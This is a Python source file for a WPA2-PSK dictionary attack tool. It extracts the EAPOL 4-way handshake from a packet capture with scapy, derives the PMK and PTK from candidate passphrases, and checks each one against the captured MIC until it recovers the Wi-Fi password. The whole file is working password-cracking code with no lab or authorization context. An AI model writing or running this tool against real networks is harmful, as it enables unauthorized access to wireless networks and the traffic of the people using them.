import scapy.all as scapy
from pbkdf2 import PBKDF2
import hmac
import hashlib
import struct


class WPA2Cracker:
    """
    WPA2 Dictionary Attack Tool

    This tool performs a dictionary attack on WPA2-PSK networks by:
    1. Extracting the 4-way handshake from a pcap file
    2. Deriving cryptographic keys from password candidates
    3. Verifying passwords by comparing computed vs captured MIC values
    """

    def __init__(self, pcap_file, ssid):
        self.pcap_file = pcap_file
        self.ssid = ssid
        self.handshake_data = None

    def extract_handshake(self):
        """
        STEP 1: Extract WPA2 4-way handshake from pcap

        Purpose: Parse EAPOL packets to extract cryptographic nonces and MIC
        Process:
        - Message 1 (AP→Client): Extract ANonce + MAC addresses
        - Message 2 (Client→AP): Extract SNonce + MIC for verification
        """
        packets = scapy.rdpcap(self.pcap_file)
        eapol_packets = [
            p for p in packets if p.haslayer(scapy.EAPOL) and p.haslayer(scapy.Dot11)
        ]

        if len(eapol_packets) < 2:
            print("Insufficient EAPOL packets for handshake")
            return None

        eapol_packets.sort(key=lambda x: x.time)
        anonce = snonce = ap_mac = client_mac = mic = mic_data = None

        for i, pkt in enumerate(eapol_packets):
            eapol_raw = bytes(pkt[scapy.EAPOL])
            if len(eapol_raw) < 97:
                continue

            # Parse EAPOL key packet structure (IEEE 802.11-2016)
            key_info = struct.unpack(">H", eapol_raw[5:7])[0]
            key_nonce = eapol_raw[17:49]  # Nonce field (32 bytes)
            key_mic = eapol_raw[81:97]  # MIC field (16 bytes)

            # Extract message type flags
            ack = bool(key_info & 0x0080)  # Acknowledge bit
            mic_flag = bool(key_info & 0x0100)  # MIC bit
            pairwise = bool(key_info & 0x0008)  # Pairwise bit

            if pairwise and ack and not mic_flag and not anonce:
                # Message 1: AP sends ANonce to client
                anonce = key_nonce
                dot11 = pkt[scapy.Dot11]
                ap_mac = dot11.addr2.replace(":", "").lower()
                client_mac = dot11.addr1.replace(":", "").lower()

            elif pairwise and mic_flag and not ack and not snonce:
                # Message 2: Client sends SNonce + MIC to AP
                snonce = key_nonce
                mic = key_mic
                # Prepare MIC verification data (original packet with MIC zeroed)
                mic_data = eapol_raw[:81] + b"\x00" * 16 + eapol_raw[97:]

        if not all([anonce, snonce, ap_mac, client_mac, mic, mic_data]):
            print("Failed to extract complete handshake")
            return None

        self.handshake_data = {
            "anonce": anonce,
            "snonce": snonce,
            "ap_mac": ap_mac,
            "client_mac": client_mac,
            "mic": mic,
            "mic_data": mic_data,
        }

        print(f"✓ Handshake extracted: AP={ap_mac[:6]}..., Client={client_mac[:6]}...")
        return self.handshake_data

    def derive_ptk(self, passphrase):
        """
        STEP 2: Derive Pairwise Transient Key (PTK) from passphrase

        Purpose: Generate cryptographic keys for MIC verification
        Process:
        - PMK = PBKDF2(passphrase, SSID, 4096 iterations) [RFC 2898]
        - PTK = PRF(PMK, "Pairwise key expansion", MAC1||MAC2||Nonce1||Nonce2)
        - Return KCK (first 16 bytes) for MIC calculation
        """
        # Step 1: Derive Pre-Shared Master Key using PBKDF2
        pmk = PBKDF2(passphrase, self.ssid.encode("utf-8"), 4096).read(32)

        # Step 2: Sort MAC addresses and nonces (lexicographically)
        mac1, mac2 = bytes.fromhex(self.handshake_data["ap_mac"]), bytes.fromhex(
            self.handshake_data["client_mac"]
        )
        nonce1, nonce2 = self.handshake_data["anonce"], self.handshake_data["snonce"]

        mac_data = (mac1 + mac2) if mac1 < mac2 else (mac2 + mac1)
        nonce_data = (nonce1 + nonce2) if nonce1 < nonce2 else (nonce2 + nonce1)

        # Step 3: Generate PTK using Pseudo-Random Function
        ptk = self._prf(pmk, b"Pairwise key expansion\x00", mac_data + nonce_data, 64)
        return ptk[:16]  # Return KCK (Key Confirmation Key)

    def _prf(self, key, prefix, data, length):
        """Pseudo-Random Function implementation using HMAC-SHA1"""
        result, counter = b"", 0
        while len(result) < length:
            result += hmac.new(
                key, prefix + data + bytes([counter]), hashlib.sha1
            ).digest()
            counter += 1
        return result[:length]

    def verify_passphrase(self, passphrase):
        """
        STEP 3: Verify passphrase by comparing MIC values

        Purpose: Check if candidate password generates matching MIC
        Process:
        - Derive KCK from passphrase using PTK derivation
        - Compute MIC = HMAC-SHA1(KCK, EAPOL_frame_with_zeroed_MIC)[:16]
        - Compare with captured MIC from handshake
        """
        try:
            kck = self.derive_ptk(passphrase)
            computed_mic = hmac.new(
                kck, self.handshake_data["mic_data"], hashlib.sha1
            ).digest()[:16]
            return computed_mic == self.handshake_data["mic"]
        except:
            return False

    def dictionary_attack(self, dictionary_file):
        """
        STEP 4: Perform dictionary attack

        Purpose: Test password candidates until correct one is found
        Process: Iterate through dictionary and verify each password
        """
        if not self.handshake_data:
            print("❌ No handshake data available")
            return None

        try:
            with open(dictionary_file, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
        except Exception as e:
            print(f"❌ Dictionary error: {e}")
            return None

        print(f"🔍 Testing {len(passwords)} passwords...")

        for i, pwd in enumerate(passwords, 1):
            if self.verify_passphrase(pwd):
                print(f"🎉 PASSWORD FOUND: {pwd}")
                return pwd
            if i % 100 == 0:
                print(f"   Tested {i}/{len(passwords)} passwords...")

        print("❌ Password not found in dictionary")
        return None
